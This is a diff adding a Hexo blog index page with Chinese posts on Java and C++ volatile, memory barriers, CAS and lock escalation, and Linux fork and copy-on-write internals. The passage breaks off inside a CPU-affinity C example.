@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-Volatile" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/06/15/Volatile/" class="article-date">
+  <time class="dt-published" datetime="2020-06-15T23:09:52.000Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/06/15/Volatile/">Volatile</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p><strong>Java Memory Model</strong></p>
+<blockquote>
+<p>The Java Memory Model was the first attempt to provide a comprehensive threading memory<br> model for a popular programming language.</p>
+</blockquote>
+<p><strong>CPU写内存的机制</strong></p>
+<ul>
+<li>同步写<ul>
+<li><ol>
+<li>将写内存的请求写入Store Buffer</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>CPU马上将Store Buffer的写内存的请求执行，将数据刷回内存</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>异步写 (主流CPU都是这种机制)<ul>
+<li><ol>
+<li>将写内存的请求写入Store Buffer</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>CPU空闲后将Store Buffer的写内存请求执行，将数据刷回内存，内存屏障让异步写达到了同步写的效果</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<p>step1: y:524 in L1 cache<br>step2: [r1=y load] y:524 in Load Buffer/168 in Store Buffer<br>step3: [x=168 store] 168 in C-0 L1/C-5 L1/Memory<br><img src="/images/volatile/outoforder.png"></p>
+<blockquote>
+<p>通过volatile标记，可以解决编译器层面的可见性与重排序问题。而内存屏障则解决了硬件层面的可见性与重排序问题</p>
+</blockquote>
+<ol>
+<li>为什么有了MESI的缓存一致性协议，还需要加volatile关键字呢，是不是多此一举？<br>答： MESI协议为了提高性能，引入了Store Buffe和Invalidate Queues，还是有可能会引起缓存不一致，所以需要再引入内存屏障来确保一致性</li>
+<li>内存屏障怎么实现的呢？<br>答：内存屏障是硬件层的. x86架构的处理器中允许处理器对Store-Load操作进行重排,与之对应有StoreLoad Barriers禁止其重排. StoreLoad Barriers同时具备其他三个屏障的效果,因此也称之为全能屏障,是目前大多数处理器所支持的,但是相对其他屏障,该屏障的开销相对昂贵.<br>在x86架构的处理器的指令集中,lock指令可以触发StoreLoad Barriers.通过 #lock前缀实现 （导致其它的CPU也触发一定的动作来同步自己的Cache。#lock引脚链接到北桥芯片(North Bridge)的#lock引脚，当带lock前缀的执行执行时，北桥芯片会拉起#lock电平，从而锁住总线，直到该指令执行完毕再放开。   而总线加锁会自动invalidate所有CPU对 _该指令涉及的内存的Cache）<br>LOCK用于在多处理器中执行指令时对共享内存的独占使用<br>它的作用是能够将当前处理器对应缓存的内容刷新到内存，并使其他处理器对应的缓存失效<br>另外还提供了有序的指令无法越过这个内存屏障的作用<br><code>  The LOCK prefix ensures that the CPU has exclusive ownership of the appropriate cache line   for the duration of the operation, and provides certain additional ordering guarantees.                This may be achieved by asserting a bus lock, but the CPU will avoid this where possible.   If the bus is locked then it is only for the duration of the locked instruction.</code></li>
+<li>Java volatile关键字的作用：<br>答：线程可见性，禁止指令重排序，不保证原子性。转换成指令以后，多了一个<code>lock addl $0x0, (%esp)</code>空操作，相当于一个内存屏障 </li>
+</ol>
+<ul>
+<li>1） 可见性：lock前缀会强制将本处理器的写缓冲区/高速缓冲中的脏数据写入内存，该写入动作也会引起别的处理器无效化(invalidate)其缓存。</li>
+<li>2） 禁止重排序： CPU流水线可能会对指令重排序。当<code>lock addl $0x0, (%esp)</code> 把修改同步到内存时，意味着所有之前的操作都已经完成，这样便形成了“指令重排序无法越过内存屏障”的效果</li>
+</ul>
+<h1 id="as-if-serial"><a href="#as-if-serial" class="headerlink" title="as if serial"></a>as if serial</h1><p>不管如何重排序，单线程执行结果不会变</p>
+<h1 id="DCL-Double-Check-Lock-单例-需要volatile"><a href="#DCL-Double-Check-Lock-单例-需要volatile" class="headerlink" title="DCL (Double Check Lock) 单例 需要volatile"></a>DCL (Double Check Lock) 单例 需要volatile</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class DclSingleton &#123;</span><br><span class="line">    private static volatile DclSingleton instance;</span><br><span class="line">    public static DclSingleton getInstance() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            synchronized (DclSingleton .class) &#123;</span><br><span class="line">                if (instance == null) &#123;</span><br><span class="line">                    instance = new DclSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // private constructor and other methods...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>new一个对象半初始化,加volatile防止指令重排序</p>
+<p>thread 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NEW java/lang/String # 半初始化的对象指针入栈</span><br><span class="line">DUP # 复制一个栈顶元素</span><br><span class="line">INVOKESPECIAL java/lang/String.&lt;init&gt; ()V # 构造初始化，消耗掉一个栈顶元素</span><br><span class="line">ASTORE 1 # 将栈顶元素赋值给对象</span><br></pre></td></tr></table></figure>
+<p>指令重排后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NEW java/lang/String # 半初始化的对象指针入栈</span><br><span class="line">DUP # 复制一个栈顶元素</span><br><span class="line">ASTORE 1 # 将栈顶元素赋值给对象t</span><br><span class="line">INVOKESPECIAL java/lang/String.&lt;init&gt; ()V # 构造初始化，消耗掉一个栈顶元素</span><br></pre></td></tr></table></figure>
+
+<p>thread 2<br>    if (t != null) 使用了半初始化的对象</p>
+<h1 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h1><p>确保了对同一个同一个内存地址操作的原子性, 在x86架构上，CAS被翻译为”lock cmpxchg…“，当两个core同时执行针对同一地址的CAS指令时,其实他们是在试图修改每个core自己持有的Cache line. 向ring bus发出invalidate操作，ring bus仲裁后core0和core1，胜者完成结果，输者接受结果。</p>
+<p>Java Object Layout:</p>
+<ul>
+<li>markword : 8 bytes</li>
+<li>class pointer: 4 bytes</li>
+<li>实例数据 + padding</li>
+</ul>
+<p>锁的信息记录在markdword上，一开始默认偏向锁ID101</p>
+<ul>
+<li>无锁态 -&gt; 偏向锁 ， 第一个运行这个object的线程贴上标签</li>
+<li>偏向锁 -&gt; 自旋锁： 发生任意冲突，一个人已经占据这个坑了，另一个人要抢. 撤销偏向锁，在每个线程的线程栈里生成一个自己的对象，叫 Lock Record 锁记录， 尝试往obj贴上去，使用自旋锁（轻量级锁）谁贴成功了就是谁的，由偏向锁升级为自旋锁 （CAS compare and swap）</li>
+<li>竞争激烈，自旋超过一定次数升级为重量级锁，在内核生成，有一定的资源限制，不消耗cpu，操作系统决定什么时候给你解冻 （为什么升级，比如1000个线程，有一个线程卡着不出来）</li>
+</ul>
+<p><img src="/images/volatile/lock.png"></p>
+<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>C++ volatile 只意味着不做优化，禁止指令重排序 和 每次都从内存获取值, 语言级别的 memory barrier. <code>NOT suitable for concurrent programming</code></p>
+<ul>
+<li>1 volatile关键字可以禁止指令优化，其实这里发挥了编译器屏障的作用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">        int foo = 11;</span><br><span class="line">        int a = 1;</span><br><span class="line">        a = 2;</span><br><span class="line">        a = foo + 10;</span><br><span class="line">        int b = a + 20;</span><br><span class="line">        return b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g++ -O1 test.cpp -o test</span><br><span class="line">objdump -d -M intel test | grep &quot;&lt;main&gt;:&quot; -A 30</span><br></pre></td></tr></table></figure>
+<p><img src="/images/volatile/cpp1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">        volatile int foo = 11;</span><br><span class="line">        volatile int a = 1;</span><br><span class="line">        a = 2;</span><br><span class="line">        a = foo + 10;</span><br><span class="line">        int b = a + 20;</span><br><span class="line">        return b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/volatile/cpp2.png"></p>
+<ul>
+<li><p>2 对声明为volatile的变量操作时，每次都会从内存中取值，而不会使用原先保存在寄存器中的值。本测试开启了一级优化，即 -O1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int func(int a) &#123;</span><br><span class="line">    int x;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    if (a &gt; x) return a;</span><br><span class="line">    else return x;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    volatile int a = 5;</span><br><span class="line">    int b = 10;</span><br><span class="line">    int c = 20;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;c);</span><br><span class="line">    a = func(c);</span><br><span class="line">    b = func(a);</span><br><span class="line"></span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">g++ -O1 test.cpp -o test</span><br><span class="line">objdump -d -M intel test | grep &quot;&lt;main&gt;:&quot; -A 30</span><br><span class="line"></span><br><span class="line">无 volatile</span><br><span class="line">8d9:   e8 7c ff ff ff          call   85a &lt;_Z4funci&gt; </span><br><span class="line"> 8de:   89 c7                   mov    edi,eax // a = func(c)</span><br><span class="line"> 8e0:   e8 75 ff ff ff          call   85a &lt;_Z4funci&gt; // b = func(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有volatile</span><br><span class="line"> 8e0:   e8 75 ff ff ff          call   85a &lt;_Z4funci&gt; // a = func(c)</span><br><span class="line"> 8e5:   89 04 24                mov    DWORD PTR [rsp],eax // 返回值a写回内存</span><br><span class="line"> 8e8:   8b 3c 24                mov    edi,DWORD PTR [rsp] // 从内存取出a</span><br><span class="line"> 8eb:   e8 6a ff ff ff          call   85a &lt;_Z4funci&gt; // b = func(a)</span><br></pre></td></tr></table></figure></li>
+<li><p>3 顺序性<br>如果两个都声明为volatile，那么编译器就不会对指令进行重排</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">volatile int a,b;</span><br><span class="line">int fun() &#123;</span><br><span class="line">        a = b + 1;</span><br><span class="line">        b = 0;</span><br><span class="line">        return b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g++ -O2 test.cpp -o test</span><br><span class="line">objdump -d -M intel test | grep &#x27;funv&gt;:&#x27; -A 10</span><br><span class="line"></span><br><span class="line">无volatile</span><br><span class="line">0000000000000780 &lt;_Z3funv&gt;:</span><br><span class="line"> 780:   8b 05 8e 08 20 00       mov    eax,DWORD PTR [rip+0x20088e]        # 201014 &lt;b&gt;</span><br><span class="line"> 786:   c7 05 84 08 20 00 00    mov    DWORD PTR [rip+0x200884],0x0        # 201014 &lt;b&gt; // b = 0</span><br><span class="line"> 78d:   00 00 00</span><br><span class="line"> 790:   83 c0 01                add    eax,0x1</span><br><span class="line"> 793:   89 05 7f 08 20 00       mov    DWORD PTR [rip+0x20087f],eax        # 201018 &lt;a&gt; // a = b + 1</span><br><span class="line"></span><br><span class="line">有volatile</span><br><span class="line">00000000000007a0 &lt;_Z3funv&gt;:</span><br><span class="line"> 7a0:   8b 05 6e 08 20 00       mov    eax,DWORD PTR [rip+0x20086e]        # 201014 &lt;b&gt;</span><br><span class="line"> 7a6:   83 c0 01                add    eax,0x1</span><br><span class="line"> 7a9:   89 05 69 08 20 00       mov    DWORD PTR [rip+0x200869],eax        # 201018 &lt;a&gt; // a = b + 1</span><br><span class="line"> 7af:   c7 05 5b 08 20 00 00    mov    DWORD PTR [rip+0x20085b],0x0        # 201014 &lt;b&gt; // b = 0</span><br><span class="line"> 7b6:   00 00 00</span><br><span class="line"> 7b9:   8b 05 55 08 20 00       mov    eax,DWORD PTR [rip+0x200855]        # 201014 &lt;b&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/06/15/Volatile/" data-id="ckqhp9u6u000s3ot07l8r6nlv" data-title="Volatile" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Linux-thread" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/06/15/Linux-thread/" class="article-date">
+  <time class="dt-published" datetime="2020-06-15T19:47:50.000Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/06/15/Linux-thread/">Linux thread</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="task-struct-mm-struct"><a href="#task-struct-mm-struct" class="headerlink" title="task_struct / mm_struct"></a>task_struct / mm_struct</h1><p>一个进程的虚拟地址空间主要由两个数据结构来描述。一个是最高层次的：mm_struct（定义在mm_types.h中），一个是较高层次的：vm_area_structs。最高层次的mm_struct结构描述了一个进程的整个虚拟地址空间。较高层次的结构vm_area_truct描述了虚拟地址空间的一个区间（简称虚拟区或线性区）。每个进程只有一个mm_struct结构，在每个进程的task_struct结构中，有一个指向该进程的结构。可以说，mm_struct结构是对整个用户空间（注意，是用户空间）的描述。</p>
+<p>在linux系统里，进程和线程都是通过task_struct结构体来描述。Linux系统 对线程和进程并不特别区分。线程仅仅被视为一个与其他线程共享某些资源的进程。每个线程都拥有唯一自己的task_struct。</p>
+<p><img src="/images/linux_thread/pcb.png"></p>
+<p><img src="/images/linux_thread/mm.png"></p>
+<p><img src="/images/linux_thread/process_whiteboard.png"></p>
+<h1 id="do-fork"><a href="#do-fork" class="headerlink" title="do_fork"></a>do_fork</h1><p><img src="/images/linux_thread/mm_copy.png"><br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/kernel/fork.c">https://elixir.bootlin.com/linux/latest/source/kernel/fork.c</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1690373">https://cloud.tencent.com/developer/article/1690373</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">do_fork:</span><br><span class="line">  copy_process:</span><br><span class="line"> 	dup_task_struct</span><br><span class="line">	copy_mm:</span><br><span class="line">	  if (clone_flags &amp; CLONE_VM) &#123; // 检查clone_flags中是否有CLONE_VM标志，若有，两个进程之间共享VM，即就是创建轻量级进程(线程)</span><br><span class="line">		mmget(oldmm);</span><br><span class="line">		mm = oldmm;</span><br><span class="line">		goto good_mm;</span><br><span class="line">	  &#125;</span><br><span class="line">	  dup_mm: // 新进程</span><br><span class="line">		mm = allocate_mm(); // 分配一个新的内存描述符。把它的地址存放在新进程的mm中</span><br><span class="line">		memcpy(mm, oldmm, sizeof(*mm)); // 并从当前进程复制mm的内容</span><br><span class="line">		mm_init:</span><br><span class="line">		  mm_alloc_pgd // 函数会调用pgd_alloc()会为该进程分配一页(4K)的页全局目录的线性地址并保存在 task_struct-&gt;mm_struct-&gt;pgd中</span><br><span class="line">		/**</span><br><span class="line">		 * dup_mmap不但复制了线性区和页表，也设置了mm的一些属性.</span><br><span class="line">		 * 它也会改变父进程的私有，可写的页为只读的，以使写时复制机制生效。</span><br><span class="line">		 */</span><br><span class="line">		dup_mmap:</span><br><span class="line">			for (mpnt = oldmm-&gt;mmap; mpnt; mpnt = mpnt-&gt;vm_next)&#123;</span><br><span class="line">				tmp = vm_area_dup(mpnt);</span><br><span class="line">				if (!(tmp-&gt;vm_flags &amp; VM_WIPEONFORK))</span><br><span class="line">					retval = copy_page_range(mm, oldmm, mpnt, tmp);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">struct vm_area_struct *vm_area_dup(struct vm_area_struct *orig)</span><br><span class="line">&#123;</span><br><span class="line">	struct vm_area_struct *new = kmem_cache_alloc(vm_area_cachep, GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">	if (new) &#123;</span><br><span class="line">		ASSERT_EXCLUSIVE_WRITER(orig-&gt;vm_flags);</span><br><span class="line">		ASSERT_EXCLUSIVE_WRITER(orig-&gt;vm_file);</span><br><span class="line">		/*</span><br><span class="line">		 * orig-&gt;shared.rb may be modified concurrently, but the clone</span><br><span class="line">		 * will be reinitialized.</span><br><span class="line">		 */</span><br><span class="line">		*new = data_race(*orig);</span><br><span class="line">		INIT_LIST_HEAD(&amp;new-&gt;anon_vma_chain);</span><br><span class="line">		new-&gt;vm_next = new-&gt;vm_prev = NULL;</span><br><span class="line">	&#125;</span><br><span class="line">	return new;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">copy_page_range:</span><br><span class="line">	unsigned long addr = vma-&gt;vm_start;</span><br><span class="line">	unsigned long end = vma-&gt;vm_end;</span><br><span class="line">	dst_pgd = pgd_offset(dst_mm, addr);</span><br><span class="line">	src_pgd = pgd_offset(src_mm, addr);</span><br><span class="line">	do &#123;</span><br><span class="line">		next = pgd_addr_end(addr, end); // 页全局目录下一条</span><br><span class="line">		if (pgd_none_or_clear_bad(src_pgd))</span><br><span class="line">			continue;</span><br><span class="line">		if (unlikely(copy_p4d_range(dst_mm, src_mm, dst_pgd, src_pgd,</span><br><span class="line">					    vma, new, addr, next))) &#123;</span><br><span class="line">			ret = -ENOMEM;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; while (dst_pgd++, src_pgd++, addr = next, addr != end);</span><br></pre></td></tr></table></figure>
+
+<p>copy_process函数中首先调用dup_task_struct()函数为子进程创建task_struct结构体等信息，然后根据clone_flags集合中的标志值，设置共享或者复制父进程打开的文件、文件系统信息、信号处理函数、进程地址空间、命名空间等资源，其中copy_mm函数实现父进程地址空间的拷贝，也就是fork创建子进程时的写时复制机制的核心处了，接下来看看这个函数的实现。</p>
+<p>copy_mm()中检查clone_flags中是否有CLONE_VM标志，</p>
+<ul>
+<li><p>若有，两个进程之间共享VM，即就是创建轻量级进程(线程)，</p>
+</li>
+<li><p>否则，就是fork创建进程，从而调用dup_mm()函数为子进程分配一个新的mm_struct结构体。</p>
+<ul>
+<li>使用dup_mmap()函数为子进程拷贝父进程地址空间，其中调用copy_page_range()函数进行页表的拷贝，由于linux中采用四级分页机制，分别是pgd、pud、pmd、pte，因而依次对其进行拷贝，最终在拷贝pte的函数copy_pte_range中调用copy_one_page函数实现真正的写时复制。</li>
+</ul>
+</li>
+</ul>
+<p>在该函数中判断页是否支持写时复制，若支持就给其添加写保护，在写操作发生时，发生写保护错误，从而为子进程新分配一块内存。</p>
+<p><img src="/images/linux_thread/4page.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">static inline void</span><br><span class="line">copy_one_pte(struct mm_struct *dst_mm,  struct mm_struct *src_mm,</span><br><span class="line">		pte_t *dst_pte, pte_t *src_pte, unsigned long vm_flags,</span><br><span class="line">		unsigned long addr)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	/*</span><br><span class="line">	 * If it&#x27;s a COW mapping, write protect it both</span><br><span class="line">	 * in the parent and the child</span><br><span class="line">	 */</span><br><span class="line">	if ((vm_flags &amp; (VM_SHARED | VM_MAYWRITE)) == VM_MAYWRITE) &#123;</span><br><span class="line">		ptep_set_wrprotect(src_pte);</span><br><span class="line">		pte = *src_pte;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * If it&#x27;s a shared mapping, mark it clean in</span><br><span class="line">	 * the child</span><br><span class="line">	 */</span><br><span class="line">	if (vm_flags &amp; VM_SHARED)</span><br><span class="line">		pte = pte_mkclean(pte);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="“one-to-one”-model"><a href="#“one-to-one”-model" class="headerlink" title="“one-to-one” model"></a>“one-to-one” model</h1><p>LinuxThreads follows the so-called “one-to-one” model: each thread is actually a separate process in the kernel. The kernel scheduler takes care of scheduling the threads, just like it schedules regular processes. The threads are created with the Linux clone() system call, which is a generalization of fork() allowing the new process to share the memory space, file descriptors, and signal handlers of the parent.</p>
+<p>内核线程的最大优势就是能够充分利用多处理器</p>
+<h1 id="进程绑定CPU"><a href="#进程绑定CPU" class="headerlink" title="进程绑定CPU"></a>进程绑定CPU</h1><p>cpu 虚拟化，通过虚拟化，intel超线程技术，虚拟化出更多的cpu，vcpu与物理cpu不是一一对应的关系<br>两层：</p>
+<ul>
+<li>针对硬件芯片的虚拟化，单核4个超线程，一个核可以虚拟4个cpu出来</li>
+<li>再往上走一层，虚拟cpu在vmware上也可以进程虚拟，纯软件的虚拟化，这个与cpu没有太大的关系，虚拟出来的vmware的多个cpu实际上是多个进程，并不是物理的cpu，4个处理器就是4个进程</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#define _USED_GNU</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line"></span><br><span class="line">int cpu_bind(int num) &#123;</span><br><span class="line">    pid_t self_id = syscall(__NR_gettid);</span><br><span class="line"></span><br><span class="line">    cpu_set_t mask;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(self_id % num, &amp;mask);</span><br><span class="line"></span><br><span class="line">    sched_setaffinity(0, sizeof(mask), &amp;mask);</span><br><span class="line">    while(1);</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    int num = sysconf(_SC_NPROCESSORS_CONF);</span><br><span class="line">    printf(&quot;cpu cores: %d\n&quot;, num);</span><br><span class="line">    pid_t pid = 0;</span><br><span class="line">    for (int i = 0; i &lt; num; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        // 父进程 返回大于0的值，为子进程的id</span><br><span class="line">        // 子进程 返回0</span><br><span class="line">        if (pid &lt;= (pid_t)0) &#123; // 是子进程，让父进程先行</span><br><span class="line">            usleep(1);</span><br><span class="line">            